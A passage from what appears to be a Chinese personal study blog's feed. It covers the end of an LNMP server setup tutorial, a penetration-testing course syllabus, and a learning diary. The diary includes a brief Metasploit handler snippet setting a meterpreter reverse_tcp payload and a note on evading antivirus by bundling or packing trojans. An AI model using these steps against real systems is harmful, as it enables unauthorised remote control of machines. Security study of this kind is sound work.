若不添加此配置信息，后续您使用浏览器访问PHP页面时，页面将无法显示。</p><ol><li><p>运行以下命令打开Nginx配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/nginx/nginx.conf<br>1<br></code></pre></td></tr></table></figure></li><li><p>按i进入编辑模式。</p></li><li><p>在<code>server</code>大括号内，修改或添加下列配置信息。</p><p>除下面提及的需要添加或修改的配置信息外，其他配置保持默认值即可。</p><ul><li><p>添加或修改</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/</span><br><span class="hljs-title">1</span><br></code></pre></td></tr></table></figure><p>配置信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined">        location / &#123;<br>            index index.php index.html index.htm;<br>        &#125;<br>123<br></code></pre></td></tr></table></figure></li><li><p>添加或修改</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">~ .php</span>$<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>配置信息。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">        <span class="hljs-comment">#添加下列信息，配置Nginx通过fastcgi方式处理您的PHP请求。</span><br>        location ~ .php<span class="hljs-variable">$ </span>&#123;<br>            root /usr/share/nginx/html;    <span class="hljs-comment">#将/usr/share/nginx/html替换为您的网站根目录，本文使用/usr/share/nginx/html作为网站根目录。</span><br>            fastcgi_pass <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">9000</span>;   <span class="hljs-comment">#Nginx通过本机的9000端口将PHP请求转发给PHP-FPM进行处理。</span><br>            fastcgi_index index.php;<br>            fastcgi_param  <span class="hljs-variable constant_">SCRIPT_FILENAME</span>  <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>            <span class="hljs-keyword">include</span> fastcgi_params;   <span class="hljs-comment">#Nginx调用fastcgi接口处理PHP请求。</span><br>        &#125;<br><span class="hljs-number">12345678</span><br></code></pre></td></tr></table></figure></li></ul><p>添加或修改配置信息后，文件内容如下图所示：<img src="https://img-blog.csdnimg.cn/img_convert/f3c336288e7921ba0aa3c6626830859e.png" alt="nginx配置文件"></p></li><li><p>按下Esc键后，输入:wq并回车以保存关闭配置文件。</p></li></ol></li><li><p>运行以下命令启动Nginx服务。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">systemctl <span class="hljs-keyword">start</span> nginx <br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令设置Nginx服务开机自启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> nginx<br>1<br></code></pre></td></tr></table></figure></li></ol><h2 id="步骤六：配置MySQL"><a href="#步骤六：配置MySQL" class="headerlink" title="步骤六：配置MySQL"></a>步骤六：配置MySQL</h2><ol><li><p>运行以下命令查看&#x2F;var&#x2F;log&#x2F;mysqld.log文件，获取并记录root用户的初始密码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">grep <span class="hljs-string">&#x27;temporary password&#x27;</span> /<span class="hljs-keyword">var</span>/log/mysqld.<span class="hljs-property">log</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>命令行返回结果如下，其中<code>ARQTRy3+n8*W</code>为MySQL的初始密码。在下一步重置root用户密码时，会使用该初始密码。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-number">2021</span>-<span class="hljs-number">11</span>-10<span class="hljs-attr">T07</span>:<span class="hljs-number">01</span>:<span class="hljs-number">26.</span>595215Z <span class="hljs-number">1</span> [<span class="hljs-title class_">Note</span>] A temporary password is generated <span class="hljs-keyword">for</span> root<span class="hljs-meta">@localhost</span>: <span class="hljs-title class_">ARQTRy3</span>+n8*W<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令配置MySQL的安全性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">mysql_secure_installation<br>1<br></code></pre></td></tr></table></figure><ol><li><p>输入MySQL的初始密码。</p><p><strong>说明</strong> 在输入密码时，系统为了最大限度的保证数据安全，命令行将不做任何回显。您只需要输入正确的密码信息，然后按Enter键即可。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Securing</span> <span class="hljs-string">the</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">server</span> <span class="hljs-string">deployment.</span><br><br><span class="hljs-attr">Enter password for user root:</span> <span class="hljs-comment">#输入上一步获取的root用户初始密码</span><br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure></li><li><p>为MySQL设置新密码。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs csharp">The existing password <span class="hljs-keyword">for</span> the user account root has expired. Please <span class="hljs-keyword">set</span> a <span class="hljs-keyword">new</span> password.<br><br>New password: <span class="hljs-meta">#输入新密码。长度为8至30个字符，必须同时包含大小写英文字母、数字和特殊符号。特殊符号包含()` ~!@#$%^&amp;*-+=|&#123;&#125;[]:;‘&lt;&gt;,.?/</span><br><br>Re-enter <span class="hljs-keyword">new</span> password: <span class="hljs-meta">#确认新密码。</span><br>The <span class="hljs-string">&#x27;validate_password&#x27;</span> plugin <span class="hljs-keyword">is</span> installed <span class="hljs-keyword">on</span> the server.<br>The subsequent steps will run <span class="hljs-keyword">with</span> the existing configuration<br>of the plugin.<br>Using existing password <span class="hljs-keyword">for</span> root.<br><br>Estimated strength of the password: <span class="hljs-number">100</span> <span class="hljs-meta">#返回结果包含您设置的密码强度。</span><br>Change the password <span class="hljs-keyword">for</span> root ? ((Press y|Y <span class="hljs-keyword">for</span> Yes, any other key <span class="hljs-keyword">for</span> No) :Y <span class="hljs-meta">#您需要输入Y以确认使用新密码。</span><br><br><span class="hljs-meta">#新密码设置完成后，需要再次验证新密码。</span><br>New password:<span class="hljs-meta">#再次输入新密码。</span><br><br>Re-enter <span class="hljs-keyword">new</span> password:<span class="hljs-meta">#再次确认新密码。</span><br><br>Estimated strength of the password: <span class="hljs-number">100</span><br>Do you wish to <span class="hljs-keyword">continue</span> <span class="hljs-keyword">with</span> the password provided?(Press y|Y <span class="hljs-keyword">for</span> Yes, any other key <span class="hljs-keyword">for</span> No) :Y <span class="hljs-meta">#您需要输入Y，再次确认使用新密码。</span><br><span class="hljs-number">1234567891011121314151617181920</span><br></code></pre></td></tr></table></figure></li><li><p>输入Y删除匿名用户。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Remove</span> <span class="hljs-string">anonymous</span> <span class="hljs-string">users?</span> <span class="hljs-string">(Press</span> <span class="hljs-string">y|Y</span> <span class="hljs-string">for</span> <span class="hljs-literal">Yes</span><span class="hljs-string">,</span> <span class="hljs-string">any</span> <span class="hljs-string">other</span> <span class="hljs-string">key</span> <span class="hljs-string">for</span> <span class="hljs-literal">No</span><span class="hljs-string">)</span> <span class="hljs-string">:Y</span><br><span class="hljs-string">Success.</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure></li><li><p>输入Y禁止使用root用户远程登录MySQL。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Disallow</span> <span class="hljs-string">root</span> <span class="hljs-string">login</span> <span class="hljs-string">remotely?</span> <span class="hljs-string">(Press</span> <span class="hljs-string">y|Y</span> <span class="hljs-string">for</span> <span class="hljs-literal">Yes</span><span class="hljs-string">,</span> <span class="hljs-string">any</span> <span class="hljs-string">other</span> <span class="hljs-string">key</span> <span class="hljs-string">for</span> <span class="hljs-literal">No</span><span class="hljs-string">)</span> <span class="hljs-string">:Y</span><br><span class="hljs-string">Success.</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure></li><li><p>输入Y删除test库以及用户对test库的访问权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove <span class="hljs-built_in">test</span> database and access to it? (Press y|Y <span class="hljs-keyword">for</span> Yes, any other key <span class="hljs-keyword">for</span> No) :Y<br> - Dropping <span class="hljs-built_in">test</span> database...<br>Success.<br><br> - Removing privileges on <span class="hljs-built_in">test</span> database...<br>Success.<br>123456<br></code></pre></td></tr></table></figure></li><li><p>输入Y重新加载授权表。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Reload</span> <span class="hljs-string">privilege</span> <span class="hljs-string">tables</span> <span class="hljs-string">now?</span> <span class="hljs-string">(Press</span> <span class="hljs-string">y|Y</span> <span class="hljs-string">for</span> <span class="hljs-literal">Yes</span><span class="hljs-string">,</span> <span class="hljs-string">any</span> <span class="hljs-string">other</span> <span class="hljs-string">key</span> <span class="hljs-string">for</span> <span class="hljs-literal">No</span><span class="hljs-string">)</span> <span class="hljs-string">:Y</span><br><span class="hljs-string">Success.</span><br><br><span class="hljs-string">All</span> <span class="hljs-string">done!</span><br><span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="步骤七：配置PHP"><a href="#步骤七：配置PHP" class="headerlink" title="步骤七：配置PHP"></a>步骤七：配置PHP</h2><ol><li><p>新建并编辑phpinfo.php文件，用于展示PHP信息。</p><ol><li><p>运行以下命令新建phpinfo.php文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim &lt;网站根目录&gt;/phpinfo.php<br>1<br></code></pre></td></tr></table></figure><p>&lt;网站根目录&gt;是您在nginx.conf配置文件中<code>location ~ .php$</code>大括号内，配置的<code>root</code>参数值，如下图所示。<img src="https://img-blog.csdnimg.cn/img_convert/3fbc36d8d7c1051c5d0045c8ec0a3696.png" alt="网站根目录">本文配置的网站根目录为&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html，因此需要运行以下命令新建phpinfo.php文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /usr/share/nginx/html/phpinfo.php<br>1<br></code></pre></td></tr></table></figure></li><li><p>按i进入编辑模式。</p></li><li><p>输入下列内容，函数<code>phpinfo()</code>会展示PHP的所有配置信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>按Esc键后，输入:wq并回车，保存关闭配置文件。</p></li></ol></li><li><p>运行以下命令启动PHP-FPM。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">systemctl <span class="hljs-keyword">start</span> php<span class="hljs-operator">-</span>fpm<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>运行以下命令设置PHP-FPM开机自启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> php-fpm<br>1<br></code></pre></td></tr></table></figure></li></ol><h2 id="步骤八：测试访问LNMP配置信息页面"><a href="#步骤八：测试访问LNMP配置信息页面" class="headerlink" title="步骤八：测试访问LNMP配置信息页面"></a>步骤八：测试访问LNMP配置信息页面</h2><ol><li><p>在本地Windows主机或其他具有公网访问能力的Windows主机中，打开浏览器。</p></li><li><p>在浏览器的地址栏输入<code>http://&lt;ECS实例公网IP地址&gt;/phpinfo.php</code>进行访问。</p><p>访问结果如下图所示，表示LNMP环境部署成功。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/59b342565045db08c3b1603518eacc13.png" alt="php结果"></p></li></ol><p>未对安全性作要求,本地部署.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>web security</title>
    <link href="/2022/10/09/web-security/"/>
    <url>/2022/10/09/web-security/</url>
    
    <content type="html"><![CDATA[<h2 id="真是太好了"><a href="#真是太好了" class="headerlink" title="真是太好了~~"></a>真是太好了~~</h2><h2 id="我看刑-很可拷"><a href="#我看刑-很可拷" class="headerlink" title="我看刑 很可拷"></a>我看刑 很可拷</h2><p>第一章：操作系统基础</p><ul><li>课时1：vm和Linux上</li><li>课时2：vm和Linux下</li><li>课时3：Linux基础命令上</li><li>课时4：Linux基础命令下</li><li>课时5：用户权限划分上</li><li>课时6：用户权限划分下</li><li>课时7：linux搭建lamp上</li><li>课时8：linux搭建lamp下</li><li>课时9：windows基础命令与环境搭建上</li><li>课时10：windows基础命令与环境搭建下</li></ul><p>第二章：网络学习</p><ul><li>课时1：网络应用基础上</li><li>课时2：网络应用基础下</li><li>课时3：网络层（一）上</li><li>课时4：网络层（一）下</li><li>课时5：网络层（二）上</li><li>课时6：网络层（二）下</li><li>课时7：传输层、应用层上</li><li>课时8：传输层、应用层下</li><li>课时9：交换机原理与路由</li><li>课时10：路由交换技术</li></ul><p>第三章：基础编程</p><ul><li>课时1：HTML&#x2F;CSS</li><li>课时2：JavaScript基础</li><li>课时3：JavaScript函数与对象上</li><li>课时4：JavaScript函数与对象下</li><li>课时5：JavaScript DOM操作与事件上</li><li>课时6：JavaScript DOM操作与事件下</li><li>课时7：PHP基础语法上</li><li>课时8：PHP基础语法下</li><li>课时9：表单处理与文件操作上</li><li>课时10：表单处理与文件操作下</li><li>课时11：MySQL数据库上</li><li>课时12：MySQL数据库下</li><li>课时13：会话控制上</li><li>课时14：会话控制下</li><li>课时15：优化留言板上</li><li>课时16：优化留言板下</li></ul><p>第四章：Web安全</p><ul><li>课时1：Web安全基础上</li><li>课时2：Web安全基础下</li><li>课时3：WebShell使用与变形上</li><li>课时4：WebShell使用与变形下</li><li>课时5：Webshell-基础实验</li><li>课时6：webshell过流量检测-拓展实验</li><li>课时7：SQL注入原理与手工注入流程上</li><li>课时8：SQL注入原理与手工注入流程下</li><li>课时9：万能密码和手工注入-基础实验</li><li>课时10：sql联合查询注入-拓展实验</li><li>课时11：报错注入与盲注上</li><li>课时12：报错注入与盲注下</li><li>课时13：常见类型注入-基础实验</li><li>课时14：手工报错注入-拓展实验</li><li>课时15：Metinfo 盲注-拓展实验</li><li>课时16：SQL注入漏洞-扩展实验</li><li>课时17：SQL注入其他种类上</li><li>课时18：SQL注入其他种类下</li><li>课时19：题目讲解</li><li>课时20：宽字节注入-基础实验</li><li>课时21：二次编码注入-基础实验</li><li>课时22：堆叠注入-基础实验</li><li>课时23：请求头注入-拓展实验</li><li>课时24：阐道pms sql注入-拓展实验</li><li>课时25：搜索处注入-拓展实验</li><li>课时26：espcms_v6sql注入-扩展实验</li><li>课时27：宽字节注入-扩展实验</li><li>课时28：堆叠注入-拓展实验</li><li>课时29：sqlmap-DocCms二次编码注入-拓展实验</li><li>课时30：seacms sql注入-拓展实验</li><li>课时31：ucms_后台sql注入-扩展实验</li><li>课时32：FreeSMS_2.1.2 sql注入漏洞-扩展实验</li><li>课时33：sqlmap介绍与基本使用上</li><li>课时34：sqlmap介绍与基本使用下</li><li>课时35：深入了解sqlmap上</li><li>课时36：深入了解sqlmap下</li><li>课时37：sqlmap-参数使用-基础实验</li><li>课时38：sqlmap-读写文件-执行命令-基础实验</li><li>课时39：二阶注入-基础实验</li><li>课时40：二阶注入-拓展实验</li><li>课时41：poscms SQL注入-拓展实验</li><li>课时42：sqlmap-任意存在宽字节注入的cms-拓展实验</li><li>课时43：Sqlmap工具-phpmyadmin getshell的两种方式-拓展实验</li><li>课时44：WAF介绍与绕过技巧上</li><li>课时45：WAF介绍与绕过技巧下</li><li>课时46：waf绕过-基础实验</li><li>课时47：SQL注入绕过技巧-拓展实验</li><li>课时48：SQL环境题目讲解上</li><li>课时49：SQL环境题目讲解下</li><li>课时50：mssql注入上</li><li>课时51：mssql注入下</li><li>课时52：MSSQL注入实验-基础实验</li><li>课时53：Access注入实验-基础实验</li><li>课时54：Dnslog带外Mssql注入-拓展实验</li><li>课时55：Oracle注入上</li><li>课时56：Oracle注入下</li><li>课时57：Oracle注入实验-基础实验</li><li>课时58：oricle注入练习-拓展实验</li><li>课时59：Nosql注入上</li><li>课时60：Nosql注入下</li><li>课时61：NOSQL注入实验_基础实验</li><li>课时62：NOSQL注入实验-拓展实验</li><li>课时63：文件上传漏洞原理与检测上</li><li>课时64：文件上传漏洞原理与检测下</li><li>课时65：文件上传一 -基础实验</li><li>课时66：文件上传二 -基础实验</li><li>课时67：WellCms后台文件上传-扩展实验</li><li>课时68：Bootcms_1.1.3后台文件上传-扩展实验</li><li>课时69：finecms任意文件上传-扩展实验</li><li>课时70：phpcms任意文件上传-扩展实验</li><li>课时71：cwcms任意文件上传漏洞-拓展实验</li><li>课时72：黑白名单与解析漏洞上</li><li>课时73：黑白名单与解析漏洞下</li><li>课时74：iis7.5解析漏洞-基础实验</li><li>课时75：iis6解析漏洞-基础实验</li><li>课时76：apache解析漏洞-基础实验</li><li>课时77：nginx解析-拓展实验</li><li>课时78：apache解析-拓展实验</li><li>课时79：FCKeditor文件上传漏洞-拓展实验</li><li>课时80：FCKeditor突破“_”上传-拓展实验</li><li>课时81：eweb编译器文件上传漏洞-拓展实验</li><li>课时82：文件包含漏洞上</li><li>课时83：文件包含漏洞下</li><li>课时84：文件包含-基础实验</li><li>课时85：文件包含截断-基础实验</li><li>课时86：php伪协议-拓展实验</li><li>课时87：phpmyadmin文件包含-拓展实验</li><li>课时88：thinkcmf任意内容包含漏洞-拓展实验</li><li>课时89：命令执行漏洞上</li><li>课时90：命令执行漏洞下</li><li>课时91：命令执行-基础实验</li><li>课时92：thinkPHP任意代码执行-拓展实验</li><li>课时93：zzzphp任意代码执行-拓展实验</li><li>课时94：macdycms rce命令执行-拓展实验</li><li>课时95：反序列化漏洞-基础实验</li><li>课时96：joomla反序列化-扩展实验</li><li>课时97：xss漏洞原理与分类上</li><li>课时98：xss漏洞原理与分类下</li><li>课时99：XSS变形与绕过上</li><li>课时100：XSS变形与绕过下                                                                                               </li><li>课时101：XSS利用上</li><li>课时102：XSS利用下</li><li>课时103：XSS-基础实验</li><li>课时104：xss编码-基础实验</li><li>课时105：XSS线上平台练习-拓展实验</li><li>课时106：xss键盘记录-基础实验</li><li>课时107：xss-getshell-基础实验</li><li>课时108：xss端口扫描-基础实验</li><li>课时109：xss线上平台搭建使用-拓展实验</li><li>课时110：xss-beef平台搭建使用-拓展实验</li><li>课时111：信息搜集的各种方法上</li><li>课时112：信息搜集的各种方法下</li><li>课时113：答疑</li><li>课时114：阶段总结复习（一）  </li><li>课时115：阶段总结复习（二）</li><li>课时116：暴力破解与扫描工具的使用上</li><li>课时117：暴力破解与扫描工具的使用中</li><li>课时118：暴力破解与扫描工具的使用下</li><li>课时119：信息收集（爆破）-基础实验</li><li>课时120：CSRF漏洞上</li><li>课时121：CSRF漏洞下</li><li>课时122：CSRF-基础实验</li><li>课时123：XXE与SSRF漏洞上</li><li>课时124：XXE与SSRF漏洞下</li><li>课时125：XXE-基础实验</li><li>课时126：ECTouch_xxe漏洞-拓展实验</li><li>课时127：phpshe_v1.7_xxe-扩展实验</li><li>课时128：ssrf-基础实验</li><li>课时129：ssrf-拓展实验</li><li>课时130：中间件漏洞上</li><li>课时131：中间件漏洞下</li><li>课时132：tomcat漏洞-基础实验</li><li>课时133：jboss漏洞-基础实验</li><li>课时134：weblogic漏洞-基础实验</li><li>课时135：慧谷cms 后台getshell-拓展实验</li><li>课时136：动易cms 后台利用iis解析漏洞getshell-拓展实验</li><li>课时137：lvyecms 后台getshell -拓展实验</li><li>课时138：dedecmsv5.7 getshell-拓展实验</li><li>课时139：齐博cms getshell-拓展实验</li><li>课时140：鲢鱼cms代码执行getshell-拓展实验</li><li>课时141：w78cms_eweb编辑器文件上传getshell-拓展实验</li><li>课时142：帝国cms后台拿shell-拓展实验</li><li>课时143：雷风cms后台拿shell-拓展实验</li><li>课时144：phpcms2008后台拿shell-拓展实验</li><li>课时145：业务逻辑漏洞（一）上</li><li>课时146：业务逻辑漏洞（一）下</li><li>课时147：业务逻辑漏洞（二）上</li><li>课时148：业务逻辑漏洞（二）下</li><li>课时149：权限绕过漏洞-基础实验</li><li>课时150：支付逻辑漏洞-基础实验</li><li>课时151：密码找回1-基础实验</li><li>课时152：密码找回2-基础实验</li><li>课时153：验证码安全-基础实验</li><li>课时154：权限绕过-拓展实验</li><li>课时155：支付逻辑漏洞-拓展实验</li></ul><p>第五章：能力拓展</p><ul><li>课时1：代码审计基础流程与工具上</li><li>课时2：代码审计基础流程与工具下</li><li>课时3：命令注入、SQL注入、XSS漏洞审计与防御上</li><li>课时4：命令注入、SQL注入、XSS漏洞审计与防御下</li><li>课时5：二次注入、文件包含、任意文件读取漏洞审计与防御上</li><li>课时6：二次注入、文件包含、任意文件读取漏洞审计与防御下</li><li>课时7：越权、暴力破解漏洞审计与强化实战上</li><li>课时8：越权、暴力破解漏洞审计与强化实战中</li><li>课时9：越权、暴力破解漏洞审计与强化实战下</li></ul><p>第六章：python</p><ul><li>课时1：python基础命令上</li><li>课时2：python基础命令下</li><li>课时3：函数、文件操作与爬虫上</li><li>课时4：函数、文件操作与爬虫下</li><li>课时5：Python爬虫与exp编写上</li><li>课时6：Python爬虫与exp编写下</li><li>课时7：Poc与其他工具编写上</li><li>课时8：Poc与其他工具编写下</li><li>课时9：Python网络编程上</li><li>课时10：Python网络编程下</li><li>课时11：阶段总结复习</li></ul><p>第七章：安全服务</p><ul><li>课时1：基线检查上</li><li>课时2：基线检查下</li><li>课时3：日志分析上</li><li>课时4：日志分析下</li><li>课时5：Linux入侵排查上</li><li>课时6：Linux入侵排查下</li><li>课时7：Windows入侵排查上</li><li>课时8：Windows入侵排查下</li><li>课时9：Linux入侵排查-基础实验</li><li>课时10：服务器入侵排查-redis未授权漏洞上</li><li>课时11：服务器入侵排查-redis未授权漏洞下</li><li>课时12：服务器入侵排查_redis未授权漏洞</li><li>课时13：异常服务排查_基础实验</li><li>课时14：windows入侵排查_基础实验</li><li>课时15：windows服务入侵排查_基础实验</li><li>课时16：windows异常服务排查_基础实验</li><li>课时17：Web入侵排查_基础实验</li><li>课时18：xss蠕虫排查_基础实验</li></ul><p>第八章：权限提升与远控技术</p><ul><li>课时1：windows提权方法上</li><li>课时2：windows提权方法下</li><li>课时3：windows2008系统提权-基础实验</li><li>课时4：windows2012系统提权-基础实验</li><li>课时5：MSSQL数据库提权-基础实验</li><li>课时6：windowsMysql提权_基础实验</li><li>课时7：oracle数据库提权_基础实验</li><li>课时8：Windows.bypass.uac_基础实验</li><li>课时9：linux提权提权方法上</li><li>课时10：linux提权提权方法下</li><li>课时11：ubuntu14脏牛提权_基础实验</li><li>课时12：centos6脏牛提权_基础实验</li><li>课时13：linux_mysql数据库提权_基础实验</li><li>课时14：权限维持和后门上</li><li>课时15：权限维持和后门下</li><li>课时16：密码获取与HASH获取上</li><li>课时17：密码获取与HASH获取下</li><li>课时18：windows2003_hash获取_基础实验</li><li>课时19：windows2012_hash获取_基础实验</li><li>课时20：win2008明文密码获取_基础实验</li><li>课时21：win_2012明文密码获取_基础实验</li><li>课时22：win2016明文密码获取_基础实验</li><li>课时23：MSF与CS的远控功能上</li><li>课时24：MSF与CS的远控功能下</li><li>课时25：msf远控功能_基础实验</li><li>课时26：msf基础和提权功能_基础实验</li></ul><p>第九章：内网渗透</p><ul><li>课时1：内网端口转发上</li><li>课时2：内网端口转发下</li><li>课时3：内网端口转发-基础实验</li><li>课时4：端口转发-基础实验</li><li>课时5：win2008反弹shell_基础实验</li><li>课时6：linux反弹shell_基础实验</li><li>课时7：边界代理上</li><li>课时8：边界代理下</li><li>课时9：边界代理-基础实验</li><li>课时10：http代理-基础实验</li><li>课时11：中间人攻击上</li><li>课时12：中间人攻击下</li><li>课时13：内网扩散信息收集上</li><li>课时14：内网扩散信息收集下</li><li>课时15：内网信息搜集-基础实验</li><li>课时16：横向渗透上</li><li>课时17：横向渗透下</li><li>课时18：多层代理-基础实验</li><li>课时19：域渗透基础上</li><li>课时20：域渗透基础下</li><li>课时21：NTLM协议与hash传递上</li><li>课时22：NTLM协议与hash传递下</li><li>课时23：NTLM协议-基础实验</li><li>课时24：票据使用上</li><li>课时25：票据使用下</li><li>课时26：票据基础-基础实验</li><li>课时27：攻击域控上</li><li>课时28：攻击域控下</li><li>课时29：ms14_068-基础实验</li><li>课时30：LADP和SPN在域中的使用上</li><li>课时31：LADP和SPN在域中的使用下</li><li>课时32：域内信息搜集-基础实验</li><li>课时33：Powershell内网渗透上</li><li>课时34：Powershell内网渗透下</li><li>课时35：powershell-基础实验</li><li>课时36：内网总结</li></ul><p>第十章：综合靶场</p><ul><li>课时1：综合靶场上</li><li>课时2：综合靶场下</li></ul><p>html css js(重点)   10~15天</p><p>python 千峰 爬虫10~15 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>learning diary</title>
    <link href="/2022/10/08/learning-diary/"/>
    <url>/2022/10/08/learning-diary/</url>
    
    <content type="html"><![CDATA[<h2 id="10-9"><a href="#10-9" class="headerlink" title="10.9"></a>10.9</h2><h4 id="msf使用方法"><a href="#msf使用方法" class="headerlink" title="msf使用方法"></a>msf使用方法</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit<br><br><span class="hljs-built_in">set</span> option<br><br><span class="hljs-built_in">run</span> <br></code></pre></td></tr></table></figure><p>msf后门木马植入和远程监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/mutil/handler<br><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><br><span class="hljs-built_in">set</span> lhost<br><br><span class="hljs-built_in">set</span> lport<br><br>run<br></code></pre></td></tr></table></figure><p>meterpreter后渗透工具</p><p>msf绕过免杀:1.捆绑木马 2.加壳</p><h3 id="windows命令基础linux命令基础"><a href="#windows命令基础linux命令基础" class="headerlink" title="windows命令基础linux命令基础"></a>windows命令基础linux命令基础</h3><ol><li><p>Win + R , 输入cmd回车  —  打开控制台<br>d: 回车   盘符切换<br>dir (directory)  列出当前目录下的文件及文件夹<br>cd (change directory) 改变指定目录(进入指定目录) 进入 cd 目录;  </p><p>cd 多级目录          回退 cd ..   ;  cd\ 返回根目录<br>cls (clear screen) 清屏<br>exit 退出dos命令行</p><p>ipconfig 查看本机ip地址</p></li><li><p>├── bin -&gt; usr&#x2F;bin # 用于存放二进制命令<br>├── boot # 内核及引导系统程序所在的目录<br>├── dev # 所有设备文件的目录（如磁盘、光驱等）<br>├── etc # 配置文件默认路径、服务启动命令存放目录<br>├── home # 用户家目录，root用户为&#x2F;root<br>├── lib -&gt; usr&#x2F;lib # 32位库文件存放目录<br>├── lib64 -&gt; usr&#x2F;lib64 # 64位库文件存放目录<br>├── media # 媒体文件存放目录<br>├── mnt # 临时挂载设备目录<br>├── opt # 自定义软件安装存放目录<br>├── proc # 